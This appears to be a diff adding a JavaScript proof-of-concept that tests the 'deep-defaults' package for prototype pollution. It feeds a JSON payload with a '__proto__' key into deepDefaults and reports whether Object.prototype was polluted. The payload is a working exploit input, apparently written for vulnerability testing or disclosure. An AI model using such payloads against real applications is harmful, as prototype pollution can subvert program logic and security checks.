@@ -1,0 +1,16 @@
+```javascript
+const deepDefaults = require("deep-defaults");
+
+const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+
+deepDefaults({}, payload);
+
+const victim = {};
+console.log("victim.polluted:", victim.polluted);
+
+if (victim.polluted === "yes") {
+  console.log("VULNERABLE: Object.prototype was polluted via _deepDefaults");
+} else {
+  console.log("not vulnerable");
+}
+```
